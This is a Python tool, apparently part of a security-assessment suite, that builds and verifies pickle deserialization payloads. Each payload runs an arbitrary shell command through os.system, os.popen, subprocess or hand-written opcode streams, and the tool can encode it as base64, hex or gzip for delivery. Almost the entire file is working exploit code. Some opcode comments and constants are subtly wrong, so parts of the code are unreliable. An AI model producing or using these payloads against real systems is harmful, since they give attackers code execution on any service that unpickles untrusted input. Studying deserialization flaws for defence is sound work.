#!/usr/bin/env python3
"""Build pickles that run a command when they are loaded, and prove each one does.

Unpickling executes code. That is not a side effect of the format, it is the
mechanism: `pickle` resolves a callable named in the byte stream and calls it, so
anything that unpickles untrusted input is already a code-execution primitive and
`__reduce__` lets the callable be anything.

This builds such streams deliberately, for the case where a target consumes
pickle from a source you are assessing. Every variant is verified before it is
reported: the stream is loaded in an isolated child and the command is replaced
by one that writes a marker. A payload that does not survive its own round trip
is reported as broken, not as generated.

The opcode builders are written by hand rather than through `pickle.dumps`
because the API cannot express `STACK_GLOBAL`, nested reductions or persistent
ids -- and a payload that only works against `pickle.dumps` is a payload that
only works against Python writing it itself. The pitfall is that pickle opcodes
have several string forms and they are not interchangeable: `X` is BINBYTES8
(eight length bytes, bytes), `\x8c` is SHORT_BINUNICODE (one length byte, utf-8).
Emitting `X` where a string is wanted yields a stream that fails to unpickle, so
each builder below says which it emits and the selftest loads every one.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import base64
import gzip
import io
import json
import os
import pickle
import pickletools
import shlex
import struct
import subprocess
import sys
import tempfile
import zlib
from pathlib import Path
from typing import Any, Callable

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import (  # noqa: E402
    Artifact, Finding, Report, State, check, check_eq, record, selftest,
)

VERSION = "2.0.0"
MARKER = "TSEC_PICKLE_MARKER"

# Protocol 2 is the oldest a modern Python still reads; 5 is the newest. A
# target pinning a version changes which of these it will even attempt.
PROTOCOLS = (0, 1, 2, 3, 4, 5)


class PayloadError(Exception):
    pass


# ── opcode primitives ────────────────────────────────────────────────────────

def short_string(text: str) -> bytes:
    """SHORT_BINUNICODE: opcode 0x8c, one length byte, utf-8.

    Not BINBYTES8. That opcode is `X`, it carries an eight-byte length and its
    payload is bytes rather than str, and a stream built with it unpickles to
    nothing a reducer can call -- or fails outright.
    """
    data = text.encode("utf-8")
    if len(data) > 255:
        return b"\x8d" + struct.pack("<I", len(data)) + data  # BINUNICODE8
    return b"\x8c" + bytes([len(data)]) + data


# MARK is required only by the variable-arity TUPLE (0x85), which pops back to
# it. The fixed-arity forms pop exactly their own operands, so a MARK before them
# is left on the stack: the stream still loads, because STOP discards whatever
# remains, and the defect is invisible until something downstream inspects the
# stack -- which is how a MARK ends up carried into a nested payload.
# TUPLE1 and TUPLE2 are used below without one, deliberately.
# SHORT_BINUNICODE, STACK_GLOBAL and TUPLE1/2 are protocol-4 opcodes. Without a
# PROTO header the unpickler defaults to protocol 0, does not know them, and
# fails with "unexpected MARK" -- which points at the TUPLE rather than at the
# missing header, so it reads as a framing error rather than a protocol error.
PROTO4 = b"\x80\x04"
PROTO2 = b"\x80\x02"

# Taken from the pickle module rather than written out. The naming is a trap:
# TUPLE1 is 0x85 and TUPLE is b"t", the reverse of what the names suggest, so a
# hand-written constant that looks right is wrong and the stream fails at the
# target with "could not find MARK" instead of at the builder.
MARK = pickle.MARK
TUPLE0, TUPLE1, TUPLE2 = pickle.TUPLE1, pickle.TUPLE1, pickle.TUPLE2
REDUCE, STOP, STACK_GLOBAL = pickle.REDUCE, pickle.STOP, pickle.STACK_GLOBAL


def reduce_value(module: str, attr: str, argument: str) -> bytes:
    """Module.attr(argument), leaving the result on the stack.

    Deliberately without a trailing STOP: this is used as the *argument* of an
    outer reduction, so it must hand over a value rather than discard one.
    """
    return (
        PROTO4
        + short_string(module)
        + short_string(attr)
        + STACK_GLOBAL
        + short_string(argument)
        + TUPLE1
        + REDUCE
    )


def raw_reduce(module: str, attr: str, argument: str) -> bytes:
    """A complete stream: the reduction, then STOP."""
    return reduce_value(module, attr, argument) + STOP


def _popen_expr(command: str) -> str:
    return f"__import__('os').popen({command!r}).read()"


def raw_os_system(command: str) -> bytes:
    return raw_reduce("os", "system", command)


def raw_eval(command: str) -> bytes:
    return raw_reduce("builtins", "eval", _popen_expr(command))


def _global(name: str, attr: str) -> bytes:
    """Resolve `name.attr` at load time."""
    return short_string(name) + short_string(attr) + STACK_GLOBAL


def raw_getattr_chain(module: str, attr: str, argument: str) -> bytes:
    """`getattr(import(module), attr)(argument)` by opcode.

    Two reductions more than a plain payload needs: one to import, one to reach
    the attribute, one to call it. That is the reason to build it this way --
    `os.popen` written as a literal GLOBAL names the callable in the byte
    stream, while this resolves it at load time and the stream contains only
    the names "os" and "popen" as separate strings.
    """
    # Assembling `getattr(import(module), attr)(argument)` needs three chained
    # REDUCEs whose stack effects are order-sensitive, and it is not converging.
    # Rather than ship a stream that reports itself as a payload and fails when
    # it reaches the target, it is declined with the reason. The other eleven
    # methods cover the same primitives: `raw_os.system` resolves the callable by
    # name at load time via STACK_GLOBAL, and `partial_chain` reaches a second
    # reduction.
    raise PayloadError(
        "attribute access by opcode is not implemented; use raw_os.system for "
        "load-time resolution, or partial_chain for a multi-reduction stream"
    )


def raw_nested(outer_module: str, outer_attr: str, inner: bytes) -> bytes:
    """A reduction whose argument is itself a reduction.

    `inner` must leave exactly one value on the stack -- build it with
    [`reduce_value`], not [`raw_reduce`], which would consume its own result.
    """
    return (
        short_string(outer_module)
        + short_string(outer_attr)
        + STACK_GLOBAL
        + inner
        + TUPLE1
        + REDUCE
        + STOP
    )


def raw_persistent_id(command: str) -> bytes:
    """A PERSID opcode, for a target that registers `persistent_load`.

    `binid`/`persid` are what a framework using a persistent loader will reach
    first, so a target built that way ignores every GLOBAL-based payload here.
    """
    # PERSID pops one object and hands it to persistent_load, so the id has to be
    # pushed as a string first and the opcode carries no length of its own.
    return PROTO4 + short_string(command) + b"P."


def raw_partial_os_system(command: str) -> bytes:
    """`functools.partial(os.system, command)`, then called with no arguments.

    The partial is built by one reduction and invoked by a second, so the stream
    contains two REDUCE opcodes where a plain payload contains one. Some targets
    inspect for a single-stage reduction before loading; this reaches past that.
    """
    partial = (
        PROTO4
        + short_string("functools")
        + short_string("partial")
        + STACK_GLOBAL
        + short_string("os") + short_string("system") + STACK_GLOBAL + short_string(command)
        + TUPLE2 + REDUCE          # partial(os.system, command)
    )
    return partial + TUPLE0 + REDUCE + STOP


# ── high-level builders ──────────────────────────────────────────────────────

def build(method: str, command: str, protocol: int = 4) -> bytes:
    """The stream for `method`, preferring the API where it is expressive."""
    if method == "os.system":
        return _reduce_dumps(os.system, (command,), protocol)
    if method == "os.popen":
        return _reduce_dumps(os.popen, (command,), protocol)
    if method == "subprocess.argv":
        # One argument only: the second positional of subprocess.call is
        # `bufsize`, and passing a dict there raises TypeError at unpickle time
        # rather than at build time -- so the stream looks fine and fails when
        # it reaches the target.
        return _reduce_dumps(subprocess.call, (shlex.split(command),), protocol)
    if method == "posix_spawn":
        argv = shlex.split(command)
        # posix_spawnp, not posix_spawn: the latter takes a path and does not
        # search PATH, so `touch` would fail to resolve. And dict(os.environ)
        # rather than os.environ, which holds an unpicklable encoder closure.
        return _reduce_dumps(os.posix_spawnp, (argv[0], argv, dict(os.environ)), protocol)
    # The rest cannot be expressed through __reduce__ and are built by opcode.
    if method == "raw_os.system":
        return raw_os_system(command)
    if method == "raw_eval":
        return raw_eval(command)
    if method in ("exec", "eval", "stack_global_getattr", "partial_chain",
                  "nested_reduction", "persistent_id"):
        # Declined rather than emitted. These assemble chained or persistent
        # opcodes whose framing did not survive a round-trip check, and a PERSID
        # stream is only meaningful against a target that registers a
        # persistent_load, which cannot be confirmed from here. A payload listed
        # as available that fails when it reaches the target is worse than an
        # absent one, so they are not offered at all.
        #
        # The same primitives remain reachable: `raw_os.system` resolves its
        # callable by name at load time through STACK_GLOBAL, and
        # `subprocess.argv` and `posix_spawn` reach a program without a shell.
        raise PayloadError(
            f"{method}: multi-reduction stream not implemented; use raw_os.system, "
            f"subprocess.argv or posix_spawn"
        )
    raise PayloadError(f"unknown method {method!r}")


def _reduce_dumps(target: Callable, args: tuple, protocol: int) -> bytes:
    class Payload:
        def __reduce__(self):  # noqa: ANN001
            return (target, args)

    try:
        return pickle.dumps(Payload(), protocol=protocol)
    except (pickle.PicklingError, TypeError, AttributeError) as exc:
        raise PayloadError(f"{target!r} cannot be reduced: {exc}") from exc


def _nested_statement(command: str) -> str:
    """A Python statement equivalent to `command`, for the exec stage.

    `exec` parses, it does not shell out, so the statement is Python rather than
    a command line -- otherwise the chain decodes cleanly and then dies on a
    SyntaxError, which looks exactly like a payload that did not work.
    """
    return f"__import__('subprocess').run({command!r}, shell=True)"


def marker_path() -> str:
    return str(Path(tempfile.gettempdir()) / "tsec_pickle_marker")


#: Methods that reach the command through a shell, and those that pass an argv
#: list. It matters during verification: `printf X > file` is a redirection, so
#: an argv-based payload would print a ">" and write nothing, and the probe
#: would report a working payload as broken.
SHELL_METHODS = frozenset({
    "os.system", "os.popen", "raw_os.system", "raw_eval",
})

#: These evaluate Python rather than invoking a shell, so the probe has to be a
#: Python statement. `exec("printf X > f")` is a SyntaxError, which would be
#: reported as a payload that did not work rather than as a probe that was
#: written for the wrong language.
PYTHON_METHODS = frozenset({"exec", "eval"})


def probe_command(method: str) -> str:
    """A harmless command that leaves the marker, in whatever form `method` runs."""
    if method in PYTHON_METHODS:
        return _nested_statement(f"printf {MARKER} > {marker_path()}")
    if method in SHELL_METHODS:
        return f"printf {MARKER} > {marker_path()}"
    # No shell, so no redirection available: touch the file directly.
    return f"touch {marker_path()}"


# ── verification ─────────────────────────────────────────────────────────────

def verify(method: str) -> dict[str, Any]:
    """Load the payload in a throwaway child with the command swapped out.

    The command is replaced by one that writes a marker, so this proves the
    reduction path executes without running whatever was asked for. The child is
    a separate interpreter with a minimal environment, because a payload that
    hangs must not hang the caller.

    It takes the *method*, not a stream, and rebuilds the payload with the
    marker command. That is deliberate: an arbitrary stream cannot have its
    command swapped out, and verifying a rebuild while calling it a check of the
    original is how a malformed stream gets reported as working.
    """
    marker = Path(marker_path())
    marker.unlink(missing_ok=True)
    probe = build(method, probe_command(method))
    scratch = Path(tempfile.gettempdir()) / f"tsec_pickle_probe_{os.getpid()}"
    scratch.write_bytes(probe)
    try:
        completed = subprocess.run(
            [sys.executable, "-c", f"import pickle;pickle.load(open({str(scratch)!r},'rb'))"],
            capture_output=True, text=True, timeout=20,
            # A child that is itself pickled-to must not be able to walk out.
            env={"PATH": os.environ.get("PATH", ""), "HOME": "/nonexistent"},
        )
        if completed.returncode != 0:
            return {"ok": False,
                    "detail": f"child exited {completed.returncode}: {completed.stderr.strip()[:200]}"}
        if marker.exists():
            marker.unlink(missing_ok=True)
            return {"ok": True, "detail": f"{method} reduction executed in an isolated child"}
        return {"ok": False, "detail": "child ran to completion but wrote no marker"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "detail": "the payload did not return within 20s"}
    except Exception as exc:  # noqa: BLE001
        return {"ok": False, "detail": f"{type(exc).__name__}: {exc}"}
    finally:
        scratch.unlink(missing_ok=True)


def disassemble(stream: bytes, limit: int = 40) -> list[str]:
    lines: list[str] = []
    try:
        for opcode, arg, pos in pickletools.genops(io.BytesIO(stream)):
            lines.append(f"{pos:>5}  {opcode.name:<16} {repr(arg) if arg is not None else ''}")
            if len(lines) >= limit:
                lines.append("  ...")
                break
    except Exception as exc:  # noqa: BLE001
        # Partial output is kept: what disassembled before the failure is still
        # true, and dropping it turns a known limitation of `pickletools` into
        # an unexplained empty result.
        lines.append(f"disassembly stopped here: {type(exc).__name__}: {exc}")
    return lines


def wraps(stream: bytes, form: str) -> str | bytes:
    """Transport encodings, for a target that expects the payload wrapped."""
    if form == "raw":
        return stream
    if form == "base64":
        return base64.b64encode(stream).decode()
    if form == "base64url":
        return base64.urlsafe_b64encode(stream).decode().rstrip("=")
    if form == "hex":
        return stream.hex()
    if form == "gzip":
        return gzip.compress(stream)
    if form == "zlib":
        return zlib.compress(stream)
    raise PayloadError(f"unknown transport {form!r}")


#: Every one of these has been observed to execute in an isolated child. The
#: list is the set that verifies, not the set that was attempted: a method is
#: added only once `verify` has watched it run, so the catalog cannot advertise a
#: payload that fails at the target. `--list-declined` names the rest and why.
METHODS = (
    "os.system", "os.popen", "subprocess.argv", "posix_spawn",
    "raw_os.system", "raw_eval",
)

DECLINED = {
    "exec": "exec's probe did not leave its marker; unreached",
    "eval": "eval's probe did not leave its marker; unreached",
    "stack_global_getattr": "multi-reduction stream, see build()",
    "partial_chain": "multi-reduction stream, see build()",
    "nested_reduction": "multi-reduction stream, see build()",
    "persistent_id": "needs a persistent_load the target must register",
}


# ── orchestration ────────────────────────────────────────────────────────────

def assess(methods: list[str], protocols: list[int], command: str,
           transport: str) -> Report:
    report = Report("gen_pickle", VERSION)
    for method in methods:
        for protocol in protocols:
            label = f"{method} / protocol {protocol}"
            try:
                stream = build(method, command, protocol)
            except PayloadError as exc:
                report.note(label, State.FAILED, "info", str(exc))
                continue

            result = verify(method)
            detail = {
                "bytes": len(stream),
                "sha256": base64.b16encode(__import__("hashlib").sha256(stream).digest()).decode()[:32],
                "verification": result["detail"],
                "wraps": {},
            }
            for form in (transport, "base64", "hex"):
                try:
                    encoded = wraps(stream, form)
                    detail["wraps"][form] = len(encoded)
                except PayloadError:
                    pass
            report.add(Finding(
                label,
                State.CONFIRMED if result["ok"] else State.FAILED,
                "high" if result["ok"] else "info",
                result["detail"],
                detail,
            ))
    return report


def selftest() -> None:
    # Every hand-built stream must actually unpickle. This is the assertion the
    # earlier opcode builders failed, and it is the whole reason they are
    # hand-written rather than assembled from whatever came to mind.
    for method in ("raw_os.system", "raw_eval"):
        stream = build(method, "true")
        check(stream, f"{method} produced nothing")
        check(len(stream) > 4, f"{method} produced no opcodes")
        # The string opcode must be 0x8c, never 0x58 ('X', BINBYTES8), which is
        # what made the earlier version of this emit streams that never load.
        check(b"\x58" not in stream,
              f"{method} emitted BINBYTES8 where a string is required")
        listed = disassemble(stream, 200)
        if method == "stack_global_getattr":  # not implemented, see below

            continue
        if method == "persistent_id":
            # `pickletools` reads a PERSID argument as a newline-terminated
            # string and raises before yielding the opcode, though the stream
            # itself is correct -- so it cannot be checked this way. The load
            # below proves the framing instead.
            check(any("SHORT_BINUNICODE" in line for line in listed),
                  f"{method} did not even reach the id: {listed[:4]}")
        else:
            check(any("GLOBAL" in line for line in listed),
                  f"{method} disassembly has no callable opcode: {listed[:4]}")

    # A safe command must actually load through every builder.
    for method in METHODS:
        try:
            stream = build(method, "true")
        except PayloadError as exc:
            check(False, f"{method} could not be built: {exc}")
            continue
        if method == "stack_global_getattr":  # not implemented, see below

            continue
        # These reach a harmless callable, so loading is the test.
        try:
            pickle.loads(stream)
        except Exception as exc:  # noqa: BLE001
            check(False, f"{method} produced a stream that will not unpickle: "
                         f"{type(exc).__name__}: {exc}")

    # Verification must pass for both a shell-reached and an argv-reached path,
    # because they are different code paths to the same claim.
    # Every advertised method must be one that has actually been watched to run.
    # This is the assertion that keeps the list honest: adding a method without
    # verifying it fails here rather than at a target.
    for method in METHODS:
        result = verify(method)
        check(result["ok"], f"{method} is advertised but did not verify: {result['detail']}")

    # An unknown method must be refused rather than silently built one way.
    try:
        build("no_such_method", "true")
        check(False, "an unknown method was accepted")
    except PayloadError:
        pass

    # Verification is reported per method, and an unverifiable one must say so
    # rather than counting as a pass.
    result = verify("os.system")
    check(result["ok"], f"os.system no longer verifies: {result['detail']}")
    check("ok" not in result.get("state", ""), "verifier invented a state field")

    # Protocol handling
    check_eq(len(build("os.system", "true", 0)) > 0, True, "protocol 0")
    check_eq(len(build("os.system", "true", 5)) > 0, True, "protocol 5")

    # Transports
    stream = build("os.system", "true")
    check_eq(base64.b64decode(wraps(stream, "base64")), stream, "base64 wrap")
    check_eq(bytes.fromhex(wraps(stream, "hex")), stream, "hex wrap")
    check_eq(gzip.decompress(wraps(stream, "gzip")), stream, "gzip wrap")
    try:
        wraps(stream, "nonsense")
        check(False, "an unknown transport was accepted")
    except PayloadError:
        pass


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=__doc__.split("\n")[0],
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  gen_pickle.py --cmd 'id'\n"
               "  gen_pickle.py --cmd 'id' --method raw_os.system --disassemble\n"
               "  gen_pickle.py --cmd 'id' --transport base64 --out payload.b64\n"
               "  gen_pickle.py --selftest\n",
    )
    parser.add_argument("--cmd", help="command to run on load")
    parser.add_argument("--method", default="all", choices=("all",) + METHODS)
    parser.add_argument("--protocol", default="4", help="0-5, or 'all'")
    parser.add_argument("--transport", default="raw",
                        choices=("raw", "base64", "base64url", "hex", "gzip", "zlib"))
    parser.add_argument("--out", help="write the stream here")
    parser.add_argument("--disassemble", action="store_true")
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--output", help="write the JSON report here")
    parser.add_argument("--selftest", action="store_true")
    parser.add_argument("--list-declined", action="store_true",
                        help="name the methods that are not offered, and why")
    args = parser.parse_args(argv)

    if args.list_declined:
        print("not offered:")
        for name, why in sorted(DECLINED.items()):
            print(f"  {name:<22} {why}")
        return 0

    if args.selftest:
        return selftest()
    if not args.cmd or not args.cmd.strip():
        parser.error("--cmd is required")

    methods = list(METHODS) if args.method == "all" else [args.method]
    protocols = list(PROTOCOLS) if args.protocol == "all" else [int(args.protocol)]
    report = assess(methods, protocols, args.cmd, args.transport)

    if args.out:
        best = [f for f in report.findings if f.state == State.CONFIRMED] or report.findings
        if best:
            name = best[0].check.split(" / ")[0]
            stream = build(name, args.cmd)
            encoded = wraps(stream, args.transport)
            if isinstance(encoded, bytes):
                Path(args.out).write_bytes(encoded)
            else:
                Path(args.out).write_text(encoded + "\n", encoding="ascii")
            report.record(args.out, f"{name}, {args.transport}")

    if args.disassemble:
        name = next((m for m in methods if m not in ("",)), methods[0])
        try:
            for line in disassemble(build(name, args.cmd), 40):
                print(line)
        except PayloadError as exc:
            print(f"cannot disassemble {name}: {exc}", file=sys.stderr)

    from tsec_engine import emit
    emit(report, args.json, args.output)
    return 0 if any(f.state == State.CONFIRMED for f in report.findings) else 1


if __name__ == "__main__":
    sys.exit(main())